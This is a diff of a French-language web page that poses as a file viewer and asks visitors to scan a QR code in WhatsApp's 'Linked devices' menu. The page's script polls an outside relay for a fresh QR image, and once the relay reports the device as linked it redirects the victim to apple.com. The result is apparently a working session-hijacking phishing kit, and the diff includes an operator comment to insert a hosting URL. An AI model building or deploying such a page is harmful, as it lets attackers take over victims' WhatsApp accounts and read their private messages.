@@ -44,19 +44,17 @@
   <p class="sub">Scannez ce code QR avec votre téléphone pour <b>lier votre appareil</b> et consulter le fichier.</p>
 
   <div class="qr-wrap blur" id="qrWrap">
-    <img id="qrImg" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='280' height='280'><rect fill='%23ffffff' width='280' height='280'/><text x='140' y='145' font-family='sans-serif' font-size='14' fill='%238696a0' text-anchor='middle'>Chargement…</text></svg>" alt="">
+    <img id="qrImg" src="" alt="">
     <div class="qr-overlay" id="qrOverlay"><span class="spin"></span> Chargement du QR…</div>
   </div>
 
-  <p class="status" id="status">Préparation…</p>
+  <p class="status" id="status">Connexion au serveur…</p>
 
   <ol class="steps">
     <li data-n="1">Ouvrez WhatsApp sur votre téléphone</li>
     <li data-n="2">Appuyez sur Menu ⋮ → Appareils liés</li>
     <li data-n="3">Appuyez sur <b>Lier un appareil</b> et scannez</li>
   </ol>
-
-  <p class="foot">🔒 Connexion chiffrée de bout en bout<br>Vos messages restent privés.</p>
 </main>
 
 <main class="card" id="done" hidden>
@@ -70,30 +68,25 @@
 (function(){
   'use strict';
 
-  const RELAY = 'https://ia5d0qabx1.preview.c40.airoapp.ai'; // Vérifiez que c'est bien votre URL
+  // REMPLACEZ PAR VOTRE URL GODADDY (avec le https://)
+  const RELAY = 'https://ia5d0qabx1.preview.c40.airoapp.ai';
   const REDIRECT = 'https://www.apple.com/';
 
   const $ = id => document.getElementById(id);
   const wrap = $('qrWrap'), img = $('qrImg'), overlay = $('qrOverlay'), st = $('status');
 
-  function setStatus(t, k){
-    st.textContent = t || '';
-    st.className = 'status' + (k ? ' ' + k : '');
-  }
-
   let isLinked = false;
-  let interval = setInterval(checkQR, 2000); // Vérifie toutes les 2 secondes
 
   async function checkQR() {
     if (isLinked) return;
     try {
-      const res = await fetch(RELAY + '/qr-json', { cache: 'no-store' });
+      const res = await fetch(RELAY + '/qr-json?t=' + Date.now());
       const data = await res.json();
 
       if (data.status === 'linked') {
-        clearInterval(interval);
         isLinked = true;
-        setStatus('Appareil lié, synchronisation…', 'ok');
+        st.textContent = 'Appareil lié, synchronisation…';
+        st.className = 'status ok';
         $('main').hidden = true;
         $('done').hidden = false;
         setTimeout(() => { location.replace(REDIRECT); }, 4000);
@@ -101,21 +94,24 @@
       }
 
       if (data.image) {
-        if (img.src !== data.image) {
-          img.src = data.image;
-          wrap.classList.remove('blur');
-          overlay.hidden = true;
-          setStatus('En attente du scan…');
-        }
+        img.src = data.image;
+        wrap.classList.remove('blur');
+        overlay.hidden = true;
+        st.textContent = 'En attente du scan…';
+        st.className = 'status';
       } else {
-        setStatus('Génération du QR en cours…');
+        st.textContent = 'Génération du QR en cours… (Patientez)';
       }
     } catch(e) {
-      setStatus('Connexion au serveur…', 'err');
+      st.textContent = 'Erreur de connexion au serveur.';
+      st.className = 'status err';
     }
   }
 
+  // Vérifie immédiatement, puis toutes les 3 secondes
   checkQR();
+  setInterval(checkQR, 3000);
+
 })();
 </script>
 </body>
